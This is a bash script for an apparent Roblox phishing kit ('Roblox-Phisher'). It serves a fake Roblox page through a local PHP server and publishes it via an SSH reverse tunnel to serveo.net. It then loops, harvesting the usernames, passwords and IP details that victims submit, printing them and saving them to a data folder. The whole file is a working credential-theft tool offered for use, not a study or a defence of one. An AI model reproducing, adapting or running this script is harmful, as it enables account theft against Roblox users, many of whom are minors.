#!/bin/bash

# ╋╋╋╋╋╋╋╋╋╋┏┓╋╋╋┏┓╋╋╋╋╋╋╋╋╋╋╋
# ╋┏━┓╋┏━━┓╋┃┗━┓╋┃┃╋╋┏━━┓╋┏┓┏┓
# ╋┃┏┛╋┃┏┓┃╋┃┏┓┃╋┃┃╋╋┃┏┓┃╋┗╋╋┛
# ╋┃┃╋╋┃┗┛┃╋┃┗┛┃╋┃┗┓╋┃┗┛┃╋┏╋╋┓ 
# ╋┗┛╋╋┗━━┛╋┗━━┛╋┗━┛╋┗━━┛╋┗┛┗┛ Created By: MilequezinMaker
# ╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋╋ Version : 0.0.1 | 2024

# MIT License

# Copyright (c) [2024] [Roblox-Phisher] 

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

if [[ ! -d ".history" ]]; then
	mkdir -p ".history"
fi

if [[ ! -d "data" ]]; then
	mkdir -p "data"
fi

if [[ -e ".server/.loclx" ]]; then
	rm -rf ".server/.loclx"

fi

if [[ -d ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"    
fi

 HOST="127.0.0.1"
 PORT="8080"

 printf "\e[1;92m"

whoami=$(command whoami)
pwd=$(command pwd)
date_time=$(date "+%Y-%m-%d %H:%M:%S")

server_site() {
	cd server-roblox && php -S "$HOST":"$PORT" > /dev/null 2>&1 &
}


timeout 3s curl -fIs "https://www.xvideos.com" > /dev/null
if [[ $? -eq 0 ]]; then
fred="\033[37mprogram \033[32mon-line\033[37m"
else
fred="\033[37mprogram \033[31moff-line\033[37m"
fi

start(){
	clear
        echo -e "\r\033[37m[-] Loading Program   "
        sleep 0.5
		clear
        echo -e "\r\033[37m[-] Loading Program.  "
        sleep 0.5
		clear
        echo -e "\r\033[37m[-] Loading Program.. "
        sleep 0.5
		clear
        echo -e "\r\033[37m[-] Loading Program..."
        sleep 0.5
		clear
timeout 3s curl -fIs "https://www.youtube.com/" > /dev/null
if [[ $? -eq 0 ]]; then
server_site
start_serveo
command cfonts "roblox" -f pallet -c yellowBright white
echo -e "Server is running on http://localhost:${PORT}"
echo -e "Server connected!"
echo -e "\n\033[32mUser Conected!\033[37m"
echo -e "WELCOME!"
echo -e "\n\033[37mlink            \033[32m$send_url\033[37m"
echo -e "version         0.0.2\ndate            $date_time\nusername        \033[36m$whoami\033[37m\nstatus          $fred\n"
data
else
sleep 0.75
echo -e ""
echo -e "\033[33mroblox \033[37mHello $whoami :)"
echo -e "\033[33mroblox \033[37mSoftware P 8080 $pwd"
echo -e "\033[33mroblox \033[37mstatus \033[31moff-line\033[37m..."

echo -e "\033[33mroblox \033[37mConnection Error| $date_time"

echo -e "\033[33mroblox \033[37mCheck your Wi-Fi network..."
start
fi
}

start_serveo() {
cd server-roblox && php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
if [[ -e server-roblox/linksender ]]; then
rm -rf server-roblox/linksender
fi
timeout 3s curl -fIs "https://www.xvideos.com" > /dev/null
if [[ $? -eq 0 ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$PORT' serveo.net 2> /dev/null > server-roblox/linksender ' &
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" server-roblox/linksender)
else
send_url=$(printf "\033[31m(ERRO!) SSH PORT 80 | Check your Wi-Fi network...\033[37m")
fi

}

ip(){
if [ ! -f "server-roblox/ipinfo.json" ]; then
    echo "Arquivo ipinfo.json não encontrado."
    exit 1
fi
cat server-roblox/ipinfo.json
cat server-roblox/ipinfo.json >> data/ipinfo.json
}

data_user(){
user=$(grep -o 'Username :.*' server-roblox/usernames.txt | awk -F ":." '{print  $NF}')
pass=$(grep -o 'Password :.*' server-roblox/usernames.txt | awk -F ":." '{print  $NF}')
IFS=$'\n'
	echo -e "     username: \033[33m$user\033[37m"
	echo -e "     password: \033[33m$pass\033[37m"
	echo -e "}"
    cat server-roblox/usernames.txt >> data/usernames.dat
}


data() {
	while true; do
		if [[ -e "server-roblox/ipinfo.json" ]]; then
			ip
			sleep 0.75
			rm -rf server-roblox/ipinfo.json
		fi
		sleep 0.75
    		if [[ -e "server-roblox/usernames.txt" ]]; then
			echo -e "\n{"
			data_user
			rm -rf server-roblox/usernames.txt
		fi
	done
}

start;